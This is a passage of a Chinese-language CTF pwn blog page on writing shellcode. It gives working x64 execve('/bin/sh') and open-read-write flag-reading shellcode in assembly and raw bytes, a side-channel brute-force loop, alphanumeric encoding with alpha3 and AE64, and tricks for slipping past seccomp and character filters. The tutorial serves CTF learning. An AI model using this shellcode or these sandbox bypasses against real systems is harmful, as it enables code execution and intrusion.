+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; excve(&#x27;/bin/sh&#x27;,&#x27;sh&#x27;,0)</span><br><span class="line">; rax: 0x3b</span><br><span class="line">; rdi: &#x27;/bin/sh&#x27; </span><br><span class="line">; rsi: &#x27;sh&#x27; </span><br><span class="line">; rdx; NULL</span><br></pre></td></tr></table></figure>
+<h2 id="最短shellcode">最短shellcode</h2>
+<h3 id="特征与条件">特征与条件</h3>
+<p>长度为22字节<br>
+主要是通过cdq将rdx高位为0，减小了长度，另一种方法是通过mul r/m64指令，实现清空rax和rdx</p>
+<ul>
+<li>eax 高二位必须为0，一般是满足的</li>
+</ul>
+<h3 id="汇编">汇编</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xor 	rsi, rsi</span><br><span class="line">push	rsi	</span><br><span class="line">mov 	rdi, 0x68732f2f6e69622f</span><br><span class="line">push	rdi</span><br><span class="line">push	rsp		</span><br><span class="line">pop	    rdi			</span><br><span class="line">mov 	al,	59	</span><br><span class="line">cdq				</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">48 31 f6             xor rsi, rsi	</span><br><span class="line">56	                 push rsi</span><br><span class="line">58 bf 2f 62 69 6e 2f mov rdi,	0x68732f2f6e69622f;</span><br><span class="line">2f 73 68</span><br><span class="line">57                   push rdi</span><br><span class="line">54                   push rsp		</span><br><span class="line">5f                   pop rdi     ;stack pointer to /bin//sh</span><br><span class="line">b0 3b                mov al, 59	 ;sys_execve 66 b8 3b 00 mov ax,59</span><br><span class="line">99                   cdq 	   	 ;sign extend of eax</span><br><span class="line">0f 05                syscall</span><br></pre></td></tr></table></figure>
+<h3 id="字节码">字节码</h3>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// int</span><br><span class="line">0x622fbf4856f63148</span><br><span class="line">0x545768732f2f6e69</span><br><span class="line">0x050f993bb05f</span><br><span class="line"></span><br><span class="line">// bytes</span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br></pre></td></tr></table></figure>
+<h2 id="orw">orw</h2>
+<h3 id="特征与条件-2">特征与条件</h3>
+<p>长度为0x28字节<br>
+主要是通过异或实现了取代了mov减少长度</p>
+<ul>
+<li>rsp指向的地址必须是可用的</li>
+<li>存在NULL字符</li>
+</ul>
+<h3 id="汇编-2">汇编</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// rdx为写入数量</span><br><span class="line">mov rdx, 0x200</span><br><span class="line">push 0x67616c66</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor esi,esi  #如果本来rsi=0，可以删掉这句</span><br><span class="line">mov eax,2</span><br><span class="line">syscall</span><br><span class="line">mov edi,eax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">xor eax,eax</span><br><span class="line">syscall</span><br><span class="line">xor edi,2  </span><br><span class="line">mov eax,edi</span><br><span class="line">syscall  </span><br></pre></td></tr></table></figure>
+<h3 id="字节码-2">字节码</h3>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x6800000200c2c748</span><br><span class="line">0x31e7894867616c66</span><br><span class="line">0x050f00000002b8f6</span><br><span class="line">0x0fc031e68948c789</span><br><span class="line">0x050ff88902f78305</span><br><span class="line"></span><br><span class="line">\x48\xc7\xc2\x00\x02\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x31\xf6\xb8\x02\x00\x00\x00\x0f\x05\x89\xc7\x48\x89\xe6\x31\xc0\x0f\x05\x83\xf7\x02\x89\xf8\x0f\x05</span><br></pre></td></tr></table></figure>
+<h3 id="可指定地址orw">可指定地址orw</h3>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov dh, 0x2</span></span><br><span class="line"><span class="string">mov rdi,&#123;&#125;</span></span><br><span class="line"><span class="string">xor esi,esi  </span></span><br><span class="line"><span class="string">mov eax,2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rsi,rdi</span></span><br><span class="line"><span class="string">mov edi,eax</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">xor edi,2</span></span><br><span class="line"><span class="string">mov eax,edi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(target_addr + <span class="number">0xb0</span>))</span><br></pre></td></tr></table></figure>
+<h2 id="侧信道爆破">侧信道爆破</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">code = asm(</span><br><span class="line">	<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	push 0x67616c66</span></span><br><span class="line"><span class="string">	mov rdi, rsp</span></span><br><span class="line"><span class="string">	xor edx, edx</span></span><br><span class="line"><span class="string">	xor esi, esi</span></span><br><span class="line"><span class="string">	push SYS_open</span></span><br><span class="line"><span class="string">	pop rax</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	xor eax, eax</span></span><br><span class="line"><span class="string">	push 6</span></span><br><span class="line"><span class="string">	pop rdi</span></span><br><span class="line"><span class="string">	push 0x50</span></span><br><span class="line"><span class="string">	pop rdx</span></span><br><span class="line"><span class="string">	mov rsi, 0x10100</span></span><br><span class="line"><span class="string">	syscall </span></span><br><span class="line"><span class="string">	mov dl, byte ptr [rsi+&#123;&#125;]</span></span><br><span class="line"><span class="string">	mov cl, &#123;&#125;</span></span><br><span class="line"><span class="string">	cmp cl, dl</span></span><br><span class="line"><span class="string">	jz loop</span></span><br><span class="line"><span class="string">	mov al,231</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	loop:</span></span><br><span class="line"><span class="string">	jmp loop</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>.<span class="built_in">format</span>(offset, ch)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<h1 id="字符限制">字符限制</h1>
+<h2 id="编码工具">编码工具</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"></th>
+<th style="text-align:center">ae64</th>
+<th><a target="_blank" rel="noopener" href="https://github.com/SkyLined/alpha3">alpha3</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Encode x32 alphanumeric shellcode</td>
+<td style="text-align:center">x</td>
+<td>✔</td>
+</tr>
+<tr>
+<td style="text-align:center">Encode x64 alphanumeric shellcode</td>
+<td style="text-align:center">✔</td>
+<td>✔</td>
+</tr>
+<tr>
+<td style="text-align:center">Original shellcode can contain zero bytes</td>
+<td style="text-align:center">✔</td>
+<td>x</td>
+</tr>
+<tr>
+<td style="text-align:center">Base address register can contain offset</td>
+<td style="text-align:center">✔</td>
+<td>x</td>
+</tr>
+</tbody>
+</table>
+<h4 id="Alpha3">Alpha3</h4>
+<p>限制只能使用字母或者数字<br>
+alpha3使用:<br>
+alpha3需要python2环境，所以先安装python2</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">sc = <span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x31\xc0\xb0\x3b\x99\x0f\x05&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./sc.bin&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(sc)</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 ALPHA3.py x64 ascii mixedcase rdx --input=&quot;sc.bin&quot; &gt; out.bin </span><br></pre></td></tr></table></figure>
+<p>可以选择架构、编码、限制的字符</p>
+<h3 id="AE64">AE64</h3>
+<p>AE64可以直接在python中导入，使用相对较为方便且限制较少</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get bytes format shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment"># get alphanumeric shellcode</span></span><br><span class="line">enc_shellcode = AE64().encode(shellcode)</span><br><span class="line"><span class="built_in">print</span>(enc_shellcode.decode(<span class="string">&#x27;latin-1&#x27;</span>))</span><br></pre></td></tr></table></figure>
+<h2 id="手动绕过">手动绕过</h2>
+<p>主要是通过sub、add、xor等指令对于非字母数字指令进行加密。<br>
+可以先根据限制筛选出受限制后的指令列表，然后根据指令列表进行组合，从而实现绕过。</p>
+<p>另一种方法是通过shellcode先实现write读取到shellcode的位置，然后输入新的无限制的<br>
+shellcode来完成绕过。</p>
+<p><a target="_blank" rel="noopener" href="https://nets.ec/Alphanumeric_shellcode">https://nets.ec/Alphanumeric_shellcode</a></p>
+<h1 id="特定位置字符限制">特定位置字符限制</h1>
+<p>在最近的*CTF中存在一个用浮点数输入字符，并对浮点数做限制写shellcode的题目，实际上是限制了每八位需要有两位是特定字符，这里给出两种绕过思路:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rcx, im64</span><br><span class="line">mov rcx, im32</span><br><span class="line">mov ecx, im32</span><br><span class="line">mov cl, im16</span><br></pre></td></tr></table></figure>
+<p>这里im是可以由我们自由控制的立即数，因此我们可以通过插入这些无关指令填充来绕过限制，上面这些指令涵盖了3、4、5字节，可以灵活插入来达到需要的效果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp short</span><br></pre></td></tr></table></figure>
+<p>通过jmp短跳转直接跳过中间指令，从而绕过限制</p>
+<p>jmp指令本身只有两个字节，更为灵活。</p>
+<h1 id="对于orw的限制">对于orw的限制</h1>
+<p>如果程序还对orw等系统调用作出了限制呢？<br>
+w的限制还好说，可以通过侧信道leak出flag，而如果禁用了open，orw就  很难进行下去了。<br>
+但是还有一种方法。</p>
+<h2 id="利用32位调用绕过orw">利用32位调用绕过orw</h2>
+<p>x86与x64的syscall number是不一样的，如果能够跳转到32位执行相应的shellcode，就可一绕过限制。</p>
+<p><strong>x86</strong> <strong>sys_number</strong></p>
+<table>
+<thead>
+<tr>
+<th>sys_number</th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>3</td>
+<td>read</td>
+<td></td>
+<td>0x03</td>
+<td>unsigned int fd</td>
+<td>char *buf</td>
+<td>size_t count</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>4</td>
+<td>write</td>
+<td></td>
+<td>0x04</td>
+<td>unsigned int fd</td>
+<td>const char *buf</td>
+<td>size_t count</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>5</td>
+<td>open</td>
+<td></td>
+<td>0x05</td>
+<td>const char *filename</td>
+<td>int flags</td>
+<td>umode_t mode</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>而程序是由32位还是64位执行是由cs寄存器决定的，而retfq指令可以对其作出更改，从而切换寄存器状态，所以可以由此实现orw。</p>
+<h2 id="x32-ABI">x32 ABI</h2>
+<p>x32 ABI 是一个应用程序二进制接口 (ABI)，也是 Linux 内核的接口之一。 x32 ABI 在 Intel 和 AMD 64 位硬件上提供 32 位整数、长整数和指针。</p>
+<p>可以通过 查看内核源代码 unistd_x32.h 查看</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/src/kernels/6.4.7-200.fc38.x86_64/arch/x86/include/generated/uapi/asm/unistd_x32.h</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _UAPI_ASM_UNISTD_X32_H              </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _UAPI_ASM_UNISTD_X32_H                </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_read (__X32_SYSCALL_BIT + 0)          </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_write (__X32_SYSCALL_BIT + 1)           </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open (__X32_SYSCALL_BIT + 2)                                 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_close (__X32_SYSCALL_BIT + 3)  </span></span><br></pre></td></tr></table></figure>
+<p>即可以通过0x40000000+syscall_number 来调用一些系统调用。所以可以绕过对syscall的限制。</p>
+<p>不过这个特性似乎在大多数发行版中不受支持。</p>
+<h2 id="io-uring">io_uring</h2>
+<p>可以通过io_uring绕过对open限制的</p>
+<h2 id="mmap">mmap</h2>
+<p>似乎mmap可以把文件映射到虚拟内存，绕过对open的限制。</p>
+<h1 id="tricks">tricks</h1>
+<ul>
+<li>对于一些题目，对shellcode的检查用到了strlen，那么可以通过先使用一些存在NULL截断的指令，从而使得后面的字符串绕过限制。</li>
+<li>在无法获取shellcode运行地址时，可以运行syscall，运行后，rcx会被改写为下一条指令的地址</li>
+</ul>
+
+            
+          </div>
+          <div class="archive-post-info">
+            <time class="archive-post-time">
+              2022-07-31
+            </time>
+            <a  class="archive-post-link" href="/Pwn.The-Art-of-Shellcode/">
+              Pwn.the-Art-of-Shellcode
+            </a>
+          </div>
+        </div>
+      
+      
+        </section></section>
+      
+  </div>
+  
+  <nav class="pagination">
+      <span class="page-number current">1</span>
+  </nav>
+
+
+
+
+        </div>
+      </main>
+      <footer class="footer syuanpi fadeIn" id="footer">
+  <hr>
+  <div class="footer-wrapper">
+    <div class="left">
+      <div class="contact-icon">
+  
+  
+    <a target="_blank" rel="noopener" href="https://www.facebook.com/" class="iconfont icon-facebook" title="facebook"></a>
+  
+    <a target="_blank" rel="noopener" href="https://twitter.com/" class="iconfont icon-twitter" title="twitter"></a>
+  
+    <a target="_blank" rel="noopener" href="https://www.instagram.com/" class="iconfont icon-instagram" title="instagram"></a>
+  
+    <a target="_blank" rel="noopener" href="https://weibo.com/" class="iconfont icon-weibo" title="weibo"></a>
+  
+    <a target="_blank" rel="noopener" href="https://www.zhihu.com/people/" class="iconfont icon-zhihu" title="zhihu"></a>
+  
+    <a target="_blank" rel="noopener" href="https://github.com/" class="iconfont icon-github" title="github"></a>
+  
+    <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/" class="iconfont icon-linkedin" title="linkedin"></a>
+  
+    <a target="_blank" rel="noopener" href="https://www.douban.com/people/" class="iconfont icon-douban" title="douban"></a>
+  
+    <a target="_blank" rel="noopener" href="https://medium.com/" class="iconfont icon-medium" title="medium"></a>
+  
+    <a target="_blank" rel="noopener" href="https://www.yuque.com/" class="iconfont icon-yuque" title="yuque"></a>
+  
+</div>
+
+    </div>
+    <div class="right">
+      <div class="copyright">
+    <div class="info">
+        <span>&copy;</span>
+        <span>2016 ~ 2024</span>
+        <span>❤</span>
+        <span>V3rdant</span>
+    </div>
+    <div class="theme">
+        <span>
+            Powered by
+            <a href="http://hexo.io/" target="_blank" rel="noopener">Hexo </a>
+        </span>
+        <span>
+            Theme
+            <a target="_blank" rel="noopener" href="https://github.com/ColMugX/hexo-theme-Nlvi"> Nlvi </a>
+        </span>
+    </div>
+    
+</div>
+
+    </div>
+  </div>
+</footer>
+    </div>
+    <div class="tagcloud" id="tagcloud">
+  <div class="tagcloud-taglist">
+  
+    <div class="tagcloud-tag">
+      <button>Pwn</button>
+    </div>
+  
+    <div class="tagcloud-tag">
+      <button>linux</button>
+    </div>
+  
+    <div class="tagcloud-tag">
+      <button>io_uring</button>
+    </div>
+  
+    <div class="tagcloud-tag">
+      <button>shellcode</button>
+    </div>
+  
+    <div class="tagcloud-tag">
+      <button>CTF</button>
+    </div>
+  
+    <div class="tagcloud-tag">
+      <button>pwn</button>
+    </div>
+  
+  </div>
+  
+    <div class="tagcloud-postlist active">
+      <h2>Pwn</h2>
+      
+        <div class="tagcloud-post">
+          <a href="/Linux.Seccomp-and-Ptrace/">
+            <time class="tagcloud-posttime">2023 / 10 / 31</time>
+            <span>Linux.Seccomp-and-Ptrace</span>
+          </a>
+        </div>
+      
+        <div class="tagcloud-post">
+          <a href="/Pwn.Heap-Exploation-up-to-2.31/">
+            <time class="tagcloud-posttime">2023 / 06 / 21</time>
+            <span>Pwn.Heap-Exploation-up-to-2.31</span>
+          </a>
+        </div>
+      
+        <div class="tagcloud-post">
+          <a href="/Pwn.I-Wanna-be-A-LLVM-Passer/">
+            <time class="tagcloud-posttime">2023 / 06 / 23</time>
+            <span>I wanna be a llvm passer</span>
+          </a>
+        </div>
+      
+    </div>
+  
+    <div class="tagcloud-postlist ">
+      <h2>linux</h2>
+      
+        <div class="tagcloud-post">
+          <a href="/Linux.Seccomp-and-Ptrace/">
+            <time class="tagcloud-posttime">2023 / 10 / 31</time>
+            <span>Linux.Seccomp-and-Ptrace</span>
+          </a>
+        </div>
+      
+        <div class="tagcloud-post">
+          <a href="/Linux.io_uring-Top-down-Approch/">
+            <time class="tagcloud-posttime">2023 / 12 / 04</time>
+            <span>Linux.io_uring-Top-down-Approch</span>
+          </a>
+        </div>
+      
+    </div>
+  
+    <div class="tagcloud-postlist ">
+      <h2>io_uring</h2>
+      
+        <div class="tagcloud-post">
+          <a href="/Linux.io_uring-Top-down-Approch/">
+            <time class="tagcloud-posttime">2023 / 12 / 04</time>
+            <span>Linux.io_uring-Top-down-Approch</span>
+          </a>
+        </div>
+      
+    </div>
+  
+    <div class="tagcloud-postlist ">
+      <h2>shellcode</h2>
+      
+        <div class="tagcloud-post">
+          <a href="/Linux.io_uring-Top-down-Approch/">
+            <time class="tagcloud-posttime">2023 / 12 / 04</time>
+            <span>Linux.io_uring-Top-down-Approch</span>
+          </a>
+        </div>
+      
+    </div>
+  
+    <div class="tagcloud-postlist ">
+      <h2>CTF</h2>
+      
+        <div class="tagcloud-post">
+          <a href="/Pwn.Heap-Exploation-up-to-2.31/">
+            <time class="tagcloud-posttime">2023 / 06 / 21</time>
+            <span>Pwn.Heap-Exploation-up-to-2.31</span>
+          </a>
+        </div>
+      
+        <div class="tagcloud-post">
+          <a href="/Pwn.I-Wanna-be-A-LLVM-Passer/">
+            <time class="tagcloud-posttime">2023 / 06 / 23</time>
+            <span>I wanna be a llvm passer</span>
+          </a>
+        </div>
+      
+    </div>
+  
+    <div class="tagcloud-postlist ">
+      <h2>pwn</h2>
+      
+        <div class="tagcloud-post">
+          <a href="/Pwn.Stack-Overflow-Overview/">
+            <time class="tagcloud-posttime">2022 / 08 / 03</time>
+            <span>Pwn.StackOverflow-Overview</span>
+          </a>
+        </div>
+      
+        <div class="tagcloud-post">
+          <a href="/Pwn.The-Art-of-Shellcode/">
+            <time class="tagcloud-posttime">2022 / 07 / 31</time>
+            <span>Pwn.the-Art-of-Shellcode</span>
+          </a>
+        </div>
+      
+    </div>
+  
+</div>
+
+  </div>
+  <div class="backtop syuanpi melt toTop" id="backtop">
+    <i class="iconfont icon-up"></i>
+    <span style="text-align:center;font-family:Georgia;"><span style="font-family:Georgia;" id="scrollpercent">1</span>%</span>
+</div>
+
+  <div class="search" id="search">
+    <div class="input">
+      <input type="text" id="search-input" placeholder="搜索一下？" autofocus>
+    </div>
+    <div id="search-result"></div>
+  </div>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+
+
+
+  <script></script>
+  <script src="/script/lib/lightbox/js/lightbox.min.js" async></script>
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="/script/scheme/banderole.js"></script>
+
+
+
+
+<script src="/script/bootstarp.js"></script>
+
+
+
+
+
+</body>
+</html>
